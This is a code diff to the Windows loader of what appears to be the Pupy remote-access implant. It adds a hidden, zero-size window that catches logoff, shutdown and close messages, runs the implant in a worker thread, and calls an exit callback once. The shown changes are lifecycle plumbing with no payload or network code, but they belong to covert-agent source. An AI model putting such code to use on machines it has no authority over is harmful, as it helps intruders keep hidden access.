@@ -21,6 +21,11 @@
 #endif
 #endif
 
+#define WINDOW_CLASS_NAME "DummyWindowClass"
+
+static on_exit_session_t on_exit_session_cb = NULL;
+static BOOL on_exit_session_called = FALSE;
+
 typedef LPWSTR* (*CommandLineToArgvW_t)(
     LPCWSTR lpCmdLine,
     int     *pNumArgs
@@ -173,7 +178,7 @@ static const PSTR Kernel32AllowedPrefixes[] = {
 };
 #endif
 
-void initialize(BOOL isDll, on_exit_session_t *cb) {
+void initialize(BOOL isDll) {
     int i, argc = 0;
     char **argv = NULL;
 
@@ -272,14 +277,10 @@ void initialize(BOOL isDll, on_exit_session_t *cb) {
     dprint("cbExit: %p\n", args.cbExit);
     dprint("pvMemoryLibraries: %p\n", args.pvMemoryLibraries);
 
-    if (cb) {
-        *cb = args.cbExit;
-    }
+    on_exit_session_cb = args.cbExit;
+
 #else
     init_pupy();
-    if (cb) {
-        *cb = on_exit_session;
-    }
 #endif
 
     return;
@@ -289,11 +290,156 @@ void deinitialize() {
     deinitialize_python();
 }
 
+LRESULT CALLBACK WinProc (HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
+{
+    BOOL blExit = FALSE;
+
+    switch (msg) {
+    case WM_QUERYENDSESSION:
+        switch (lParam) {
+            case ENDSESSION_CLOSEAPP:
+                dprint("WinProc: WM_QUERYENDSESSION/ENDSESSION_CLOSEAPP\n");
+                break;
+            case ENDSESSION_CRITICAL:
+                dprint("WinProc: WM_QUERYENDSESSION/ENDSESSION_CRITICAL\n");
+                break;
+            case ENDSESSION_LOGOFF:
+                dprint("WinProc: WM_QUERYENDSESSION/ENDSESSION_LOGOFF\n");
+                break;
+        }
+        break;
+
+    case WM_ENDSESSION:
+        blExit = TRUE;
+        dprint("WinProc: WM_ENDSESSION\n");
+        break;
+    case WM_CLOSE:
+        blExit = TRUE;
+        dprint("WinProc: WM_CLOSE\n");
+        break;
+    case WM_QUIT:
+        blExit = TRUE;
+        dprint("WinProc: WM_QUIT\n");
+        break;
+
+    default:
+        return DefWindowProc (hwnd, msg, wParam, lParam);
+    }
+
+    if (blExit) {
+        dprint("WinProc: Get Exit message. Current handler: %p\n", on_exit_session_cb);
+        if (on_exit_session_cb && !on_exit_session_called) {
+            on_exit_session_called = TRUE;
+            on_exit_session_cb();
+            dprint("WinProc: callback called\n");
+        }
+    }
+
+    return FALSE;
+}
+
+
+DWORD WINAPI _run_pupy_thread(LPVOID lpArg)
+{
+    dprint("Pupy worker started\n");
+    run_pupy();
+    dprint("Pupy worker exited\n");
+    return 0;
+}
+
 DWORD WINAPI execute(LPVOID lpArg)
 {
-    // no lpArg means shared object
+    DWORD dwExitCode = -1;
+    MSG msg;
+    BOOL bRet;
+    WNDCLASS wc;
+    HWND hwndMain;
+    HINSTANCE hinst;
+    HANDLE hThread;
+    DWORD threadId;
+    DWORD dwWake;
+    WNDCLASSEX wx;
+
     dprint("Running pupy...\n");
-    run_pupy();
-    dprint("Global Exit\n");
-    return 0;
+
+    ZeroMemory(&wx, sizeof(WNDCLASSEX));
+
+    wx.cbSize = sizeof(WNDCLASSEX);
+    wx.lpfnWndProc = WinProc;
+    wx.style = CS_GLOBALCLASS;
+    wx.lpszClassName = WINDOW_CLASS_NAME;
+
+    if ( ! RegisterClassEx(&wx) ) {
+        dprint("RegisterClassEx failed: %d\n", GetLastError());
+        goto lbExit;
+    }
+
+    hwndMain = CreateWindowEx(
+         0,
+         WINDOW_CLASS_NAME,
+         NULL,
+         0, 0, 0, 0, 0,
+         NULL, NULL, NULL, NULL
+    );
+
+    if (!hwndMain) {
+        dprint("CreateWindowEx failed: %d\n", GetLastError());
+        goto lbUnregisterClass;
+    }
+
+    hThread = CreateThread(
+        NULL,
+        0,
+        _run_pupy_thread,
+        NULL,
+        0,
+        &threadId
+    );
+
+    if (!hThread) {
+        dprint("CreateThread failed: %d\n", GetLastError());
+        dwExitCode = -GetLastError();
+        goto lbDestroyWindow;
+    }
+
+    for (;;) {
+        dwWake = MsgWaitForMultipleObjects(
+            1,
+            &hThread,
+            FALSE,
+            INFINITE,
+            QS_ALLINPUT
+        );
+
+        switch (dwWake) {
+        case WAIT_FAILED:
+            dwExitCode = -3;
+            goto lbDestroyWindow;
+
+        case WAIT_TIMEOUT:
+            continue;
+
+        case WAIT_OBJECT_0:
+            dwExitCode = 0;
+            goto lbDestroyWindow;
+
+        case WAIT_OBJECT_0 + 1:
+            while (PeekMessage( &msg, NULL, 0, 0, PM_REMOVE)) {
+                TranslateMessage(&msg);
+                DispatchMessage(&msg);
+            }
+            break;
+        }
+    }
+
+lbDestroyWindow:
+    DestroyWindow(hwndMain);
+
+lbUnregisterClass:
+    if (UnregisterClassA(WINDOW_CLASS_NAME, NULL) == FALSE) {
+        dprint("UnregisterClass failed: dwLastError=%d\n", GetLastError());
+    }
+
+lbExit:
+    return dwExitCode;
 }
